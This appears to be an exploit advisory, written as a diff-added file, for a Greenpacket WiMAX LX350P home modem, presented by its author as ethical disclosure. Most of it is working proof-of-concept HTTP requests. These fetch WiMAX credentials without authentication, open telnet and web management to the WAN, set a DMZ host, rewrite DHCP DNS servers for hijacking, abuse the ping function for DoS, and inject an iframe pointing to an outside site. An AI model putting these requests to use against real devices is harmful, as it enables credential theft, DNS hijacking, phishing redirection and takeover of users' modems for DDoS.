@@ -1,0 +1,77 @@
+### Exploit Title: WIMAX LX350P(WIXFMR-108) - Multiple Vulnerabilities
+### Date: ˝Friday, ˝December ˝11, ˝2015
+### Exploit/Vulnerability Author: Alireza Azimzadeh Milani (alimp5)
+### Vendor Homepage: http://www.greenpacket.com
+### Version: v2.10.14-g1.5.2
+### Tested on: Kali-Linux
+
+I'm an ethical penetration tester and super moderator of Iran Security Team(http://irsecteam.org)
+I have updated the modem to latest firmware which released by the company.
+but with this work(upgrading the firmware); The attacker can bypass the authentication mechanism.  
+
+### Details of LX350P model:
+Device Information:
+Hardware model:	WIXFMR-108
+Firmware version:	v2.10.14-g1.5.2-mobinnet
+Firmware version:	v2.10.14-g1.5.2
+Firmware creation date:	Mon Aug 15 16:45:58 2013
+Frequency range:	3300000KHz~3600000KHz
+Serial number:	DXHKC120702523
+
+I used below tools to find the vulnerabilities:
+1)BurpSuite - Free Edition     2)wget      3)Nmap
+
+
+### POCs of the modem:
+#Get wimax credentials>>
+wget -c "http://server/ajax.cgi?action=tag_init_wimax_auth.php"
+
+#Enable and Change DMZ_Host IP in Firewall(request manipulating with BurpSuie)>>
+POST /ajax.cgi?action=net_firewall HTTP/1.1
+Host: server
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: Language=en; page=net_firewall.php
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 113
+NETFILTER_FW_IPFILTER=&MGMT_WEB_WAN=on&MGMT_TELNET_WAN=on&NETFILTER_DMZ_HOST=8.8.8.8&btnSubmit=1
+
+#Ping a system: (We can use from below query for launching (D)DOS attacks>> 
+http://server/ajax.cgi?action=tag_ipPing&pip=4.2.2.4&cache=false
+http://server/ajax.cgi?action=tag_ipPing&pip=192.168.1.1&cache=false
+http:/server/ajax.cgi?action=tag_ipPing&pip=192.168.1.1&cache=false
+
+#Get info about WAN MAC, LAN MAC, DHCP + ... >>
+http://server/ajax.cgi?action=tag_init_net_dhcp.php&cache=false
+
+#Change the DNS IP Addresses (DNS Hijacking, Spoofing)>>
+POST /ajax.cgi?action=net_dhcp HTTP/1.1
+Host: server
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: Language=en; page=net_dhcp.php
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 945
+DHCPD_STATIC_LEASE=&DHCPD_ENABLE=1&DHCPD_START_IP_01=192&DHCPD_START_IP_02=168&DHCPD_START_IP_03=1&DHCPD_START_IP_04=2&DHCPD_START_IP=192.168.1.2&DHCPD_END_IP_01=192&DHCPD_END_IP_02=168&DHCPD_END_IP_03=1&DHCPD_END_IP_04=200&DHCPD_END_IP=192.168.1.200&dns_type_1=2&DNS_IP_1_01=6&DNS_IP_1_02=6&DNS_IP_1_03=6&DNS_IP_1_04=6&DNS_IP_1=6.6.6.6&dns_type_2=2&DNS_IP_2_01=8&DNS_IP_2_02=8&DNS_IP_2_03=8&DNS_IP_2_04=8&DNS_IP_2=8.8.8.8&dns_type_3=1&DNS_IP_3_01=0&DNS_IP_3_02=0&DNS_IP_3_03=0&DNS_IP_3_04=0&DNS_IP_3=&DHCPD_LEASE_TIME=1440&btnSubmit=1&DHCPD_DNS=2%2C6.6.6.6+2%2C8.8.8.8+1%2C0.0.0.0&ippt_enable=0&Active_0=Y&Interface_0=1&Protocol_0=1&SrcPort_0=68&DestPort_0=67&Comment_0=DHCP+request+from+lan&Active_1=Y&Interface_1=2&Protocol_1=1&SrcPort_1=67&DestPort_1=68&Comment_1=DHCP+response+from+wan&IPPT_EXCEPTION=1%2CY%2C1%2C1%2C68%2C67%2CDHCP+request+from+lan%3B2%2CY%2C2%2C1%2C67%2C68%2CDHCP+response+from+wan%3B&IPPT_EXCEPTION_NUM=2
+
+#Frame Injection>>
+http://server/ajax.cgi?action=<iframe src="http://r87.com/?"></iframe>&sid=DtTrEZnLke5Z&cache=false&time=1449547319726  
+http://server/ajax.cgi?action=<iframe src="http://r87.com/?"></iframe>&sid=DtTrEZnLke5Z&cache=false
+http://server/ajax.cgi?action=<iframe src="http://r87.com/?"></iframe>cache=false
+http://server/ajax.cgi?action=<iframe src="http://r87.com/?"></iframe>&time=3  
+ 
+
+### Conclusion: 
+1)the attacker can read sensitive information and set it on his own modem. such: for using free internet.
+2)Anyone who can send a packet to the modem for crashing/downgrading/DOS.
+3)An attacker might use "Frame Injection" to redirect users to other malicious websites that are used for phishing and similar attacks.
+4)To obtain the control of similar modem(LX350P) in order to launching DOS or DDOS attacks on targets in WWW(world wide web).  
+
+
+At the end, I am thankful and I wait for your response.
